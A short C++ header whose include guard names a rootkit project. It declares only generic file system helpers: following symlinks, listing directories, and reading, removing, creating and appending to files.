//
// Created by idan on 12/30/23.
//

#ifndef ROOTKIT_FILE_SYSTEM_ACCESS_H
#define ROOTKIT_FILE_SYSTEM_ACCESS_H

#include <filesystem>
#include <vector>

std::string follow_symlink(std::string path);

std::vector<std::string> get_dir_entries(std::string dir);

std::string read_file(char* path);

void remove_file(char* path);

void create_new_file(char* path);

void append_to_file(char* path, char* data);

#endif //ROOTKIT_FILE_SYSTEM_ACCESS_H
